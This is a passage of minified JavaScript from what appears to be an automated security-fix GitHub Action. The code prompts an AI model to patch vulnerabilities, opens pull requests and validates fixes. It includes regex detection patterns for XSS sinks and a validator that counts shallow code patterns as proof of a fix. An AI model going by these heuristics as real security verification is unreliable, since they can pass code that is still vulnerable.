qX(H),$=await Xh1(X,J,W);if(Object.keys($).length===0)return U.warn(`No files found for analysis in issue #${X.number}`),{success:!1,message:"No relevant files found for analysis"};let V=WR(J.issueType),K=`${QR(X,J,$)}

${V}`,Z;if(G&&G.vulnerabilities&&G.vulnerabilities.length>0)U.info(`Including ${G.vulnerabilities.length} security vulnerabilities in solution prompt`),Z=new EG().generateCompleteExplanation(G.vulnerabilities,$),U.info(`Generated three-tier explanations for ${Z.lineLevelExplanations.length} vulnerabilities`),K+=`

## Security Analysis Results

The following security vulnerabilities were detected and MUST be addressed in your solution:

${G.vulnerabilities.map((O)=>`- **${O.severity} Severity**: ${O.type} in ${O.file}:${O.line}
   Pattern: ${O.pattern}
   Risk: ${O.risk}
   Recommendation: ${O.recommendation}`).join(`

`)}

Please ensure your solution addresses these security issues as a priority.`;U.info(`Calling AI with prompt length: ${K.length} chars`),U.info("Prompt preview (first 500 chars):",K.substring(0,500)),U.info("Prompt preview (last 500 chars):",K.substring(K.length-500));let q=await z.complete(K,{temperature:0.2,model:Q.aiProvider.model||"claude-3-sonnet-20240229"});U.info(`AI response length: ${q.length} chars`),U.info("Raw AI solution response (first 1000 chars):",q.substring(0,1000));let B=Jh1(q);if(U.debug(`Parsed ${Object.keys(B).length} file changes from response`),Object.keys(B).length===0)return U.warn(`No changes extracted from solution for issue #${X.number}`),{success:!1,message:"Failed to extract file changes from AI solution"};return{success:!0,message:"Solution generated successfully",changes:B,explanations:Z}}catch(H){return U.error(`Error generating solution for issue #${X.number}`,H),{success:!1,message:`Error generating solution: ${H instanceof Error?H.message:String(H)}`,error:String(H)}}}async function Xh1(X,J,Q){try{let Y=[...J.filesToModify||[]];if(Y.length===0){U.info("No files explicitly identified, inferring from issue content");let G=`${X.title} ${X.body}`,H=/\.([a-zA-Z0-9]+)\b/g,z=[],$;while(($=H.exec(G))!==null)if(!z.includes($[1]))z.push($[1]);U.debug(`Inferred file extensions: ${z.join(", ")}`)}U.info(`Fetching content for ${Y.length} files`);let W={};for(let G of Y)try{if(Q)W[G]=await Q(G);else W[G]=await Qh1(G);U.debug(`Fetched content for ${G}`)}catch(H){U.warn(`Failed to fetch content for ${G}`,H)}return W}catch(Y){return U.error("Error getting files for analysis",Y),{}}}function Jh1(X){let J={};try{let Q=/---\s*([\w./-]+)\s*---\s*```[\w]*\n?([\s\S]*?)```/gm,Y;while((Y=Q.exec(X))!==null){let[,W,G]=Y;if(W&&G)J[W]=G.trim()}if(Object.keys(J).length===0){let W=/```(\w+)\s+([\w./-]+)\n([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,,G,H]=Y;if(G&&H)J[G]=H.trim()}}if(Object.keys(J).length===0){let W=/([\w./-]+):\s*```[\w]*\n?([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,G,H]=Y;if(G&&H)J[G]=H.trim()}}if(Object.keys(J).length===0){let W=/```[\w]*\n?([\s\S]*?)```/gm,G=/([\w./-]+\.\w+)/;while((Y=W.exec(X))!==null){let H=Y[1],z=Math.max(0,Y.index-100),V=X.substring(z,Y.index).match(G);if(V&&H)J[V[1]]=H.trim()}}return J}catch(Q){return U.error("Error parsing solution response",Q),{}}}async function Qh1(X){switch(await new Promise((Q)=>setTimeout(Q,100)),X.split(".").pop()?.toLowerCase()){case"js":return`// Example JavaScript file content for ${X}
function processData(input) {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

module.exports = { processData };
`;case"ts":return`// Example TypeScript file content for ${X}
interface DataItem {
  id: string;
  value: number;
}

function processData(input: DataItem[]): number[] {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

export { DataItem, processData };
`;case"py":return`# Example Python file content for ${X}
def process_data(input_data):
    # TODO: Implement proper validation
    return [item['value'] for item in input_data]

if __name__ == "__main__":
    print(process_data([{'value': 1}, {'value': 2}]))
`;case"md":return`# Documentation for ${X.split("/").pop()?.replace(".md","")}

## Overview

This documentation describes the usage and implementation details.

## Installation

\`\`\`bash
npm install example-package
\`\`\`

## Usage

\`\`\`javascript
const { processData } = require('example-package');
const result = processData([{ id: '1', value: 42 }]);
\`\`\`
`;default:return`// Example file content for ${X}
// This is a placeholder for demonstration purposes
`}}var AD=s(()=>{I1();_7();$D();CQ()});async function DD(X,J,Q,Y,W,G){try{U.info(`Creating pull request for issue #${X.number}`);let H=await Yh1(X);await Gh1(H,J,X);let z=await Hh1(X,Q,J,Y,W,G),$=await zh1(X,H,z,Q,Y);return U.info(`Successfully created PR #${$.pullRequestNumber} for issue #${X.number}`),$}catch(H){return U.error(`Error creating pull request for issue #${X.number}`,H),{success:!1,message:`Error creating pull request: ${H instanceof Error?H.message:String(H)}`,error:String(H)}}}async function Yh1(X){let J=X.title.toLowerCase().replace(/[^\w\s-]/g,"").trim().replace(/[\s]+/g,"-").substring(0,30),Q=`rsolv/${X.number}-${J}`;try{U.info(`Creating branch: ${Q}`);let Y=Z0(),{owner:W,name:G}=X.repository;try{await Y.git.createRef({owner:W,repo:G,ref:`refs/heads/${Q}`,sha:await Wh1(W,G,X.repository.defaultBranch)}),U.info(`Branch ${Q} created successfully`)}catch(H){if(H.status===422)U.warn(`Branch ${Q} already exists, using existing branch`);else throw H}return Q}catch(Y){throw U.error(`Error creating branch ${Q}`,Y),Error(`Failed to create branch: ${Y instanceof Error?Y.message:String(Y)}`)}}async function Wh1(X,J,Q){try{let Y=Z0(),{data:W}=await Y.git.getRef({owner:X,repo:J,ref:`heads/${Q}`});return W.object.sha}catch(Y){throw U.error(`Error getting SHA for ${Q}`,Y),Error(`Failed to get SHA for ${Q}: ${Y instanceof Error?Y.message:String(Y)}`)}}async function Gh1(X,J,Q){try{U.info(`Applying ${Object.keys(J).length} file changes to branch ${X}`);let Y=Z0(),{owner:W,name:G}=Q.repository,H=5,z=Object.keys(J);for(let $=0;$<z.length;$+=H){let V=z.slice($,$+H);if(await Promise.all(V.map(async(K)=>{try{let Z;try{let q=await Y.repos.getContent({owner:W,repo:G,path:K,ref:X});if(!Array.isArray(q.data))Z=q.data.sha}catch(q){if(q.status!==404)throw q}await Y.repos.createOrUpdateFileContents({owner:W,repo:G,path:K,message:`Update ${K} for issue #${Q.number}`,content:Buffer.from(J[K]).toString("base64"),branch:X,sha:Z}),U.debug(`Updated file: ${K}`)}catch(Z){throw U.error(`Error updating file ${K}`,Z),Z}})),$+H<z.length)await new Promise((K)=>setTimeout(K,200))}U.info("All changes applied successfully")}catch(Y){throw U.error("Error applying changes to branch",Y),Error(`Failed to apply changes: ${Y instanceof Error?Y.message:String(Y)}`)}}async function Hh1(X,J,Q,Y,W,G){try{U.info(`Generating PR description for issue #${X.number}`);let H=await qX(Y.aiProvider),z=YR(X,J,Q),V=await H.complete(z,{temperature:0.3,model:Y.aiProvider.model});if(W&&W.vulnerabilities&&W.vulnerabilities.length>0)V+=`

## \uD83D\uDD12 Security Fixes

This PR addresses the following security vulnerabilities:

`,W.vulnerabilities.forEach((K)=>{V+=`- **${K.severity}**: ${K.type} in \`${K.file}:${K.line}\`
`,V+=`  - Risk: ${K.risk}
`,V+=`  - Fixed by: ${K.recommendation}

`}),V+=`
### Security Impact
`,V+=`- **Vulnerabilities Fixed**: ${W.vulnerabilities.length}
`,V+=`- **Risk Level**: ${W.riskLevel||"Medium"}
`,V+=`- **Compliance**: OWASP Top 10 coverage
`;if(G){U.info("Including three-tier explanations in PR description"),V+=`

## \uD83D\uDCDA Educational Explanations

`;let K=G.businessLevelExplanation;if(V+=`### Executive Summary

`,V+=`**Risk Score**: ${K.riskScore}/100

`,V+=`${K.content}

`,V+=`**Key Business Impacts:**
`,V+=`- \uD83D\uDCB0 Financial: ${K.businessImpact.financialImpact}
`,V+=`- \uD83C\uDFE2 Reputation: ${K.businessImpact.reputationalDamage}
`,V+=`- \uD83D\uDCCA Operations: ${K.businessImpact.operationalDisruption}
`,V+=`- \uD83D\uDD12 Data: ${K.businessImpact.dataLoss}

`,K.priorities.length>0)V+=`**Recommended Actions:**
`,K.priorities.forEach((Z)=>{V+=`- ${Z}
`}),V+=`
`;if(V+=`<details>
<summary>View detailed technical explanations</summary>

`,G.conceptLevelExplanations.length>0)V+=`### Security Concepts

`,G.conceptLevelExplanations.forEach((Z)=>{if(V+=`**${Z.title}**
`,V+=`${Z.content}

`,Z.preventionMethods.length>0)V+=`Prevention methods:
`,Z.preventionMethods.forEach((q)=>{V+=`- ${q}
`}),V+=`
`});V+=`</details>
`}return V+=`

This PR was automatically generated by [RSOLV](https://rsolv.dev) to address issue #${X.number}.`,V}catch(H){return U.error("Error generating PR description",H),`Fix for issue #${X.number}

This PR addresses the issue "${X.title}" by making changes to ${Object.keys(Q).length} files.

This PR was automatically generated by [RSOLV](https://rsolv.dev).`}}async function zh1(X,J,Q,Y,W){try{let G=`[RSOLV] ${X.title} (fixes #${X.number})`;U.info(`Creating PR: ${G}`);let H=Z0(),{owner:z,name:$}=X.repository,{data:V}=await H.pulls.create({owner:z,repo:$,title:G,body:Q,head:J,base:X.repository.defaultBranch,draft:!1});return U.info(`Pull request created: ${V.html_url}`),await H.issues.addLabels({owner:z,repo:$,issue_number:V.number,labels:["rsolv:automated",`type:${Y.issueType}`]}),await H.issues.createComment({owner:z,repo:$,issue_number:X.number,body:`I've created a pull request to address this issue: ${V.html_url}

This was automatically generated by [RSOLV](https://rsolv.dev).`}),await $h1(X,V,G,W),{success:!0,message:"Pull request created successfully",pullRequestUrl:V.html_url,pullRequestNumber:V.number}}catch(G){throw U.error("Error creating GitHub PR",G),Error(`Failed to create GitHub PR: ${G instanceof Error?G.message:String(G)}`)}}async function $h1(X,J,Q,Y){try{let W=process.env.RSOLV_API_URL||"https://api.rsolv.dev",G=process.env.RSOLV_API_KEY||Y.rsolvApiKey;if(!G){U.warn("RSOLV API key not configured, skipping fix attempt recording");return}let H=new x6({baseUrl:W,apiKey:G}),z={github_org:X.repository.owner,repo_name:X.repository.name,issue_number:X.number,pr_number:J.number,pr_title:Q,pr_url:J.html_url,issue_title:X.title,issue_url:`https://github.com/${X.repository.fullName}/issues/${X.number}`,api_key_used:G,metadata:{branch:J.head?.ref||`rsolv/${X.number}`,labels:["rsolv:automated"],created_by:"rsolv-action"}};U.info(`Recording fix attempt for PR #${J.number}`);let $=await H.recordFixAttempt(z);if($.success)U.info(`Fix attempt recorded successfully: ID ${$.data?.id}`);else U.error(`Failed to record fix attempt: ${$.error}`)}catch(W){U.error("Error recording fix attempt",W)}}var wD=s(()=>{I1();z9();_7()});import ND from"fs";var mG;var LD=s(()=>{CQ();I1();mG=class mG extends Y8{contextCache=new Map;cacheTimeout=3600000;constructor(X,J=process.cwd(),Q){super(X,J,Q);if(X.claudeCodeConfig?.contextCacheDuration)this.cacheTimeout=X.claudeCodeConfig.contextCacheDuration}async gatherDeepContext(X,J){let Q=`${X.repository.fullName}-${J.contextDepth}`;if(this.contextCache.has(Q)){let W=this.contextCache.get(Q);return U.info("Using cached repository context"),W}U.info(`Starting deep context gathering with depth: ${J.contextDepth}`);let Y=Date.now();try{let W=this.buildContextGatheringPrompt(X,J),G={summary:"Analyzing issue for security vulnerabilities",complexity:"medium",estimatedTime:60,potentialFixes:[],recommendedApproach:"Generate solution using Claude Code SDK",relatedFiles:[]},H=await this.generateSolution(X,G,W),z=this.extractContextFromSolution(H);this.contextCache.set(Q,z);let $=Date.now()-Y;return U.info(`Deep context gathering completed in ${$}ms`),z}catch(W){return U.error("Error gathering deep context",W),this.createMinimalContext()}}async generateEnhancedSolution(X,J,Q){U.info("Generating enhanced solution with deep context");let Y=await this.gatherDeepContext(X,{enableUltraThink:!0,maxExplorationTime:this.config.claudeCodeConfig?.contextGatheringTimeout||300000,contextDepth:this.config.claudeCodeConfig?.contextDepth||"deep",includeArchitectureAnalysis:!0,includeTestPatterns:!0,includeStyleGuide:!0,includeDependencyAnalysis:!0}),W=this.buildEnhancedSolutionPrompt(X,J,Y,Q),G=await this.generateSolution(X,J,W);if(!G.success||!G.changes)throw Error(G.error||"Failed to generate solution");return{title:`Fix ${X.title}`,description:`This PR fixes the security issue: ${X.body}

Generated using enhanced Claude Code SDK with deep context analysis.`,files:Object.entries(G.changes).map(([H,z])=>({path:H,changes:z}))}}buildContextGatheringPrompt(X,J){return`${J.enableUltraThink?`ultrathink

`:""}I need you to perform a comprehensive analysis of this repository to gather deep context for solving an issue.

Issue Context:
Title: ${X.title}
Description: ${X.body}

Repository: ${X.repository.fullName}
Language: ${X.repository.language||"Unknown"}

Exploration Depth: ${J.contextDepth}

Please analyze the repository and provide detailed information about:

1. Architecture and Design Patterns
   - Overall architecture style
   - Main design patterns used
   - Component organization
   - Module structure

2. Code Conventions and Style
   - Naming conventions for files, functions, variables
   - Import/export patterns
   - Comment and documentation style
   - Error handling patterns

3. Testing Framework and Patterns
   - Test framework(s) used
   - Test file organization
   - Test naming conventions
   - Mocking strategies

4. Dependencies and External Libraries
   - Runtime dependencies and their usage
   - Development dependencies
   - Build tools and configurations
   - External API integrations

5. Related Components
   - Files likely to be affected by this issue
   - Related modules and interfaces
   - Shared utilities or helpers
   - Configuration files

${J.includeStyleGuide?`6. Style Guide and Best Practices
   - Code formatting rules
   - Documentation requirements
   - Security practices
   - Performance considerations
`:""}

Explore the repository comprehensively, examining:
- Configuration files (package.json, tsconfig.json, etc.)
- README and documentation
- Build and CI/CD configurations
- Test suites and examples
- Similar implementations to the requested feature

Take your time to understand the codebase deeply. Look for patterns, conventions, and architectural decisions that should be followed when implementing the solution.

Format your response as a JSON object with the structure defined in the RepositoryContext interface.`}buildEnhancedSolutionPrompt(X,J,Q,Y){if(Y)return`ultrathink

${Y}

Additional Repository Context:
${JSON.stringify(Q,null,2)}

Use this deep understanding of the repository to ensure your solution:
- Follows all established patterns and conventions
- Integrates seamlessly with existing architecture
- Includes tests that match the project's testing style
- Handles errors consistently with the rest of the codebase`;return`ultrathink

Using the comprehensive repository context I've gathered, generate a solution for:

Issue: ${X.title}
Description: ${X.body}

Repository Context Summary:
- Architecture: ${Q.architecture.patterns.join(", ")}
- Main Components: ${Q.architecture.mainComponents.join(", ")}
- Testing Framework: ${Q.testingPatterns.framework}
- Code Style: ${Q.codeConventions.namingPatterns.join(", ")}
- Error Handling: ${Q.styleGuide.errorHandling}

Related Components that may need updates:
${Q.relatedComponents.files.join(`
`)}

Generate a solution that:
1. Follows the exact patterns found in: ${Q.codeConventions.fileOrganization}
2. Uses the same naming conventions as existing code
3. Includes comprehensive tests matching the style in the test directory
4. Handles errors using the pattern: ${Q.styleGuide.errorHandling}
5. Updates all related components identified above
6. Maintains architectural consistency with the ${Q.architecture.structure} structure
7. Uses appropriate dependencies from: ${Q.dependencies.runtime.join(", ")}

Take time to think through all implications and create a production-ready solution that feels native to this codebase.

Format your response as a JSON object with title, description, files, and tests.`}extractContextFromSolution(X){return this.createMinimalContext()}async parseContextResult(X){try{let J;if(X.includes(`
`)){let Q=X.split(`
`).filter((W)=>W.trim()),Y=Q[Q.length-1];J=JSON.parse(Y)}else J=JSON.parse(X);return{architecture:J.architecture||this.createMinimalContext().architecture,codeConventions:J.codeConventions||this.createMinimalContext().codeConventions,testingPatterns:J.testingPatterns||this.createMinimalContext().testingPatterns,dependencies:J.dependencies||this.createMinimalContext().dependencies,relatedComponents:J.relatedComponents||this.createMinimalContext().relatedComponents,styleGuide:J.styleGuide||this.createMinimalContext().styleGuide}}catch(J){return U.error("Error parsing context result",J),this.createMinimalContext()}}createMinimalContext(){return{architecture:{patterns:["Unknown"],structure:"Standard",mainComponents:[]},codeConventions:{namingPatterns:["camelCase"],fileOrganization:"Standard",importPatterns:[]},testingPatterns:{framework:"Unknown",structure:"Standard",conventions:[]},dependencies:{runtime:[],dev:[],patterns:[]},relatedComponents:{files:[],modules:[],interfaces:[]},styleGuide:{formatting:"Standard",documentation:"JSDoc",errorHandling:"try-catch"}}}cleanupTempFiles(X){for(let J of X)try{if(ND.existsSync(J))ND.unlinkSync(J)}catch(Q){U.warn(`Failed to clean up temp file: ${J}`,Q)}}clearContextCache(){this.contextCache.clear(),U.info("Context cache cleared")}getCacheStats(){return{size:this.contextCache.size,keys:Array.from(this.contextCache.keys())}}}});var uG;var ID=s(()=>{CQ();I1();uG=class uG extends Y8{async generateSolutionWithContext(X,J,Q,Y){U.info("Starting single-pass solution generation with integrated context");let W=this.constructSinglePassPrompt(X,J,Y);if(Q){let G=`${W}

## Additional Instructions:
${Q}`;return this.generateSolution(X,J,G)}return this.generateSolution(X,J,W)}constructSinglePassPrompt(X,J,Q){let Y=this.constructPrompt(X,J),W=`
## Single-Pass Processing Instructions

You need to both understand the codebase AND generate a solution in this single conversation.

### Phase 1: Quick Context Gathering (Limit to 5-10 tool calls)
1. Read the main files mentioned in the issue
2. Check the project structure and dependencies if needed
3. Look for related code patterns and conventions
4. Identify test frameworks and existing tests

### Phase 2: Solution Generation
Based on your understanding from Phase 1, immediately generate a solution.

**IMPORTANT**: 
- Do NOT spend excessive time exploring the codebase
- Focus on the specific issue and files mentioned
- Generate the solution as soon as you have enough context
- Aim to complete everything within 5-7 minutes total

### Expected Output Format
After your exploration, provide the solution in this exact JSON format:

\`\`\`json
{
  "summary": "Brief description of what you're fixing",
  "files": [
    {
      "path": "relative/path/to/file.js",
      "changes": "The complete updated file content"
    }
  ],
  "testingInstructions": [
    "How to verify the fix works"
  ],
  "breakingChanges": false,
  "additionalNotes": "Any important context"
}
\`\`\``,G="";if(Q)G=`
## Security Analysis Context
${JSON.stringify(Q,null,2)}

Make sure your fix addresses all security concerns identified above.`;return`${Y}
## Single-Pass Processing Instructions

You need to both understand the codebase AND generate a solution in this single conversation.

### Phase 1: Quick Context Gathering (Limit to 5-10 tool calls)
1. Read the main files mentioned in the issue
2. Check the project structure and dependencies if needed
3. Look for related code patterns and conventions
4. Identify test frameworks and existing tests

### Phase 2: Solution Generation
Based on your understanding from Phase 1, immediately generate a solution.

**IMPORTANT**: 
- Do NOT spend excessive time exploring the codebase
- Focus on the specific issue and files mentioned
- Generate the solution as soon as you have enough context
- Aim to complete everything within 5-7 minutes total

### Expected Output Format
After your exploration, provide the solution in this exact JSON format:

\`\`\`json
{
  "summary": "Brief description of what you're fixing",
  "files": [
    {
      "path": "relative/path/to/file.js",
      "changes": "The complete updated file content"
    }
  ],
  "testingInstructions": [
    "How to verify the fix works"
  ],
  "breakingChanges": false,
  "additionalNotes": "Any important context"
}
\`\`\`${G}`}}});import{execSync as cG}from"child_process";function lG(){try{try{cG("which claude",{stdio:"ignore"})}catch{return!1}let X=!1;try{let Y=cG("claude --version 2>&1",{encoding:"utf-8",timeout:5000}).toString().trim();U.debug(`Claude CLI version: ${Y}`),X=!0}catch(Y){return U.debug("Claude CLI version check failed:",Y.message),!1}let J=cG('echo "test" | claude --print 2>&1 || echo "FAILED"',{encoding:"utf-8",timeout:30000,shell:"/bin/sh"}).toString().trim(),Q=J.length>0&&!J.toLowerCase().includes("authenticate")&&!J.toLowerCase().includes("not found");return U.debug(`Claude Max check result: "${J.substring(0,50)}..." - Working: ${Q}`),Q}catch(X){return U.debug("Claude Code Max not available:",X.message),!1}}var pG;var dG=s(()=>{h3();I1();pG=class pG extends k7{useClaudeMax=!1;constructor(X,J=process.cwd(),Q){super(X,J,Q);if(this.isDevelopmentMode())if(this.useClaudeMax=lG(),this.useClaudeMax)U.info("✅ Claude Code Max detected and will be used for development");else U.info("⚠️ Development mode enabled but Claude Code Max not available/authenticated")}async generateSolution(X,J,Q){if(this.isDevelopmentMode()&&this.useClaudeMax){U.info("\uD83D\uDE80 Using Claude Code Max (signed-in account) for development");let W=Q||this.constructPrompt(X,J);if(U.info(`Working directory: ${this.repoPath}`),U.info(`Prompt length: ${W.length} characters`),!(await this.executeWithRetry(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:void 0,CLAUDE_CODE_MAX_API_KEY:void 0}})).success)return U.warn("Claude Code Max execution failed, falling back to API mode"),super.generateSolution(X,J,Q);let H=this.getModifiedFiles();if(H.length===0)return{success:!1,message:"No files were modified by Claude Code Max",error:"Claude Code Max did not make any file changes"};U.info(`✅ Files modified by Claude Code Max: ${H.join(", ")}`);let z={};for(let $ of H)z[$]="Modified by Claude Code Max";return{success:!0,message:`Successfully modified ${H.length} file(s) using Claude Code Max`,changes:z}}return super.generateSolution(X,J,Q)}async generateSolutionWithGit(X,J,Q,Y,W,G){return U.info("Claude Code Max: Using generateSolution (git operations handled by Claude)"),this.generateSolution(X,J,Q)}isDevelopmentMode(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}}});var PD={};N0(PD,{getVulnerableFiles:()=>Uh1});import*as PQ from"fs";import*as RJ from"path";async function Uh1(X,J=10){let Q=new Map;try{let W=(await CD(X)).map((G)=>({path:G,score:qh1(G)}));W.sort((G,H)=>H.score-G.score);for(let{path:G}of W.slice(0,J))try{let H=RJ.relative(X,G),z=PQ.readFileSync(G,"utf8");Q.set(H,z),U.debug(`Added vulnerable file candidate: ${H}`)}catch(H){U.debug(`Could not read file ${G}:`,H)}}catch(Y){U.warn("Error scanning for vulnerable files:",Y)}return Q}async function CD(X,J=[],Q=0){if(Q>3)return J;try{let Y=PQ.readdirSync(X,{withFileTypes:!0});for(let W of Y){let G=RJ.join(X,W.name);if(W.isDirectory()){if(["node_modules",".git","dist","build","vendor","coverage"].includes(W.name))continue;await CD(G,J,Q+1)}else if(W.isFile()){let H=RJ.extname(W.name).toLowerCase();if(Object.values(Kh1).flat().includes(H)&&Zh1(W.name))J.push(G)}}}catch(Y){}return J}function Zh1(X){let J=X.toLowerCase();return Vh1.some((Q)=>J.includes(Q))}function qh1(X){let J=0,Q=X.toLowerCase();if(Q.includes("auth"))J+=10;if(Q.includes("login"))J+=10;if(Q.includes("password"))J+=8;if(Q.includes("token"))J+=8;if(Q.includes("sql")||Q.includes("query"))J+=7;if(Q.includes("upload"))J+=7;if(Q.includes("controller")||Q.includes("handler"))J+=5;if(Q.includes("route"))J+=4;if(Q.includes("api"))J+=4;if(Q.includes("config"))J+=3;if(Q.includes("test")||Q.includes("spec"))J-=5;return J}var Vh1,Kh1;var SD=s(()=>{I1();Vh1=["auth","login","session","password","token","crypto","database","query","sql","db","route","controller","handler","api","endpoint","form","input","upload","search","config","settings","env"],Kh1={javascript:[".js",".jsx"],typescript:[".ts",".tsx"],python:[".py"],ruby:[".rb"],php:[".php"],java:[".java"],elixir:[".ex",".exs"]}});var iG={};N0(iG,{shouldUseStaticValidation:()=>Mh1,StaticXSSValidator:()=>TD});import{execSync as Bh1}from"child_process";class TD{validateXSSFix(X,J,Q){try{let Y=this.getFileAtCommit(X,J),W=this.getFileAtCommit(X,Q),G=this.findVulnerablePatterns(W),H=this.findSafePatterns(W),z=this.validateFix(Y,W);return{isValidFix:z,vulnerablePatterns:G,safePatterns:H,error:z?void 0:"Vulnerable patterns still present or safe patterns not found"}}catch(Y){return U.error("Static validation failed",Y),{isValidFix:!1,vulnerablePatterns:[],safePatterns:[],error:Y.message}}}getFileAtCommit(X,J){try{return Bh1(`git show ${J}:${X}`,{encoding:"utf-8",stdio:"pipe"})}catch(Q){throw U.error(`Failed to get file ${X} at commit ${J}`,Q),Q}}findVulnerablePatterns(X){let J=[];if(/document\.write\s*\([^)]*\+[^)]*\)/.test(X))J.push("document.write with concatenation");if(/innerHTML\s*=\s*[^;]*\+/.test(X))J.push("innerHTML with concatenation");if(/eval\s*\([^)]*location\.|eval\s*\([^)]*window\./.test(X))J.push("eval with potential user input");if(/\$\{[^}]*location\.[^}]*\}/.test(X)&&/innerHTML|document\.write/.test(X))J.push("template literal with location in unsafe context");if(/document\.write.*location\.host/.test(X))J.push("document.write with location.host");return J}findSafePatterns(X){let J=[];if(/document\.createElement\s*\(\s*['"]script['"]\s*\)/.test(X))J.push("createElement for script tags");if(/appendChild\s*\(/.test(X))J.push("appendChild for DOM manipulation");if(/textContent\s*=/.test(X))J.push("textContent for safe text insertion");if(/allowedHosts|whitelist|includes\s*\(/.test(X))J.push("whitelist validation");if(/localhost:35729|127\.0\.0\.1:35729/.test(X)&&!/location\.host/.test(X))J.push("hardcoded safe values");return J}validateFix(X,J){let Q=this.findVulnerablePatterns(X).length>0,Y=this.findVulnerablePatterns(J).length>0,W=this.findSafePatterns(J).length>0;if(X.includes("environmentalScripts")&&J.includes("environmentalScripts")){let G=/document\.write.*location\.host/.test(X),H=/document\.write.*location\.host/.test(J);if(G&&!H){let z=/createElement.*script/.test(J),$=/appendChild/.test(J),V=/localhost:35729|127\.0\.0\.1:35729/.test(J);return z&&$||V}}return Q&&!Y&&W}}function Mh1(X,J){if(X==="XSS"||X==="Xss"){if(J.includes("config/")&&J.endsWith(".js"))return J.includes("development.js")||J.includes("client")||J.includes("browser");if(J.endsWith(".html")&&!J.includes("template"))return!0;if((J.includes("public/")||J.includes("static/"))&&J.endsWith(".js"))return!0}return!1}var rG=s(()=>{I1()});import{execSync as p6}from"child_process";function W8(X){return"commitHash"in X}function jh1(X,J){let Q=X.labels.find((Y)=>Y.startsWith("fix-validation-max-"));if(Q){let Y=parseInt(Q.replace("fix-validation-max-",""));if(!isNaN(Y))return Y}if(J.fixValidation?.maxIterationsByType){let Y=Oh1(X),W=J.fixValidation.maxIterationsByType[Y];if(W!==void 0)return W}if(J.customerTier&&J.fixValidation?.maxIterationsByTier){let Y=J.fixValidation.maxIterationsByTier[J.customerTier];if(Y!==void 0)return Y}if(J.fixValidation?.maxIterations!==void 0)return J.fixValidation.maxIterations;return 3}function Oh1(X){let J=`${X.title} ${X.body}`.toLowerCase();if(J.includes("sql injection"))return"sql-injection";if(J.includes("xss")||J.includes("cross-site scripting"))return"xss";if(J.includes("command injection"))return"command-injection";if(J.includes("path traversal"))return"path-traversal";if(J.includes("xxe")||J.includes("xml external entity"))return"xxe";return"unknown"}function Fh1(X,J,Q,Y,W){let G=Q.generatedTests?.tests?.[0]?.testCode||"",H=Q.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results (RFC-060: RED-only):
- Vulnerable Code - RED tests: ${J.vulnerableCommit.allPassed?"✅ PASSED (unexpected!)":"❌ FAILED (expected)"}
- Fixed Code - RED tests: ${J.fixedCommit.allPassed?"✅ PASSED (expected)":"❌ FAILED (problem!) - RED test failed"}

### Generated Test Code:
\`\`\`${H}
${G}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes RED tests.

### Why the Previous Fix Failed:
${Rh1(J)}

### RFC-060 Requirements:
1. The vulnerability must be completely fixed (RED tests must pass on fixed code)
2. RED tests should have FAILED on vulnerable code (proving vulnerability existed)
3. If RED tests passed on vulnerable code, the tests may be incorrect

This is attempt ${Y+1} of ${W}.`}}function Rh1(X){let J=[];if(!X.fixedCommit.allPassed){if(J.push("- **The vulnerability still exists** - RED tests are still failing on your fixed code"),X.fixedCommit.redTestsPassed&&X.fixedCommit.redTestsPassed.length>1){let Q=X.fixedCommit.redTestsPassed.map((Y,W)=>!Y?`RED test ${W+1}`:null).filter(Boolean);if(Q.length>0)J.push(`  Failed tests: ${Q.join(", ")}`)}}if(X.vulnerableCommit.allPassed)J.push("- **Warning**: RED tests passed on vulnerable code (they should have failed!)"),J.push("  This suggests the tests may not be properly detecting the vulnerability");return J.join(`
`)}function Ah1(){try{return p6("git rev-parse HEAD",{encoding:"utf-8"}).trim()}catch(X){throw U.error("Failed to get current commit",X),Error("Cannot determine current commit")}}async function ED(X,J){let Q=Date.now(),Y=Ah1();try{if(U.info(`Processing issue #${X.number} with git-based approach`),U.info("[DEBUG] Issue has specificVulnerabilities:",!!X.specificVulnerabilities),X.specificVulnerabilities)U.info("[DEBUG] Vulnerability count:",X.specificVulnerabilities.length),U.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(X.testContext){let b=X.testContext;if(U.info("[RFC-058] Test context available from validation branch:",{branchCheckedOut:b.branchCheckedOut,testFilesFound:b.testFilesFound,hasEnhancedPrompt:!!b.enhancedPrompt}),b.enhancedPrompt)X={...X,body:b.enhancedPrompt},U.info("[RFC-058] Enhanced issue with test-aware prompt from validation branch")}let W=_D();if(!W.clean){U.warn(`Repository has uncommitted changes: ${W.modifiedFiles.join(", ")}`),Dh1();let b=_D();if(!b.clean)return{issueId:X.id,success:!1,message:"Repository has uncommitted changes that could not be cleaned",error:`Uncommitted changes in: ${b.modifiedFiles.join(", ")}`};U.info("Repository cleaned successfully, proceeding with issue processing")}U.info(`Analyzing issue #${X.number}`);let G=await Z6(X,J);if(!G||!G.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};let H;if((J.testGeneration?.enabled||J.fixValidation?.enabled!==!1)&&J.enableSecurityAnalysis){U.info(`Generating tests for issue #${X.number}`);let b={provider:"anthropic",apiKey:J.aiProvider.providerApiKey,model:J.aiProvider.model,temperature:0.2,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials},h=new h6(b),L=new Map;if(G.filesToModify&&G.filesToModify.length>0){let N=(await import("fs")).default,k=(await import("path")).default;for(let _ of G.filesToModify)try{let c=k.resolve(process.cwd(),_);if(N.existsSync(c)){let a=N.readFileSync(c,"utf8");L.set(_,a),U.debug(`Added file for test generation: ${_}`)}}catch(c){U.warn(`Could not read file ${_} for test generation:`,c)}}if(L.size===0){U.info("No specific files found, scanning for common vulnerable file patterns...");let{getVulnerableFiles:N}=await Promise.resolve().then(() => (SD(),PD));(await N(process.cwd())).forEach((_,c)=>L.set(c,_))}H=await h.analyzeWithTestGeneration(X,J,L)}let 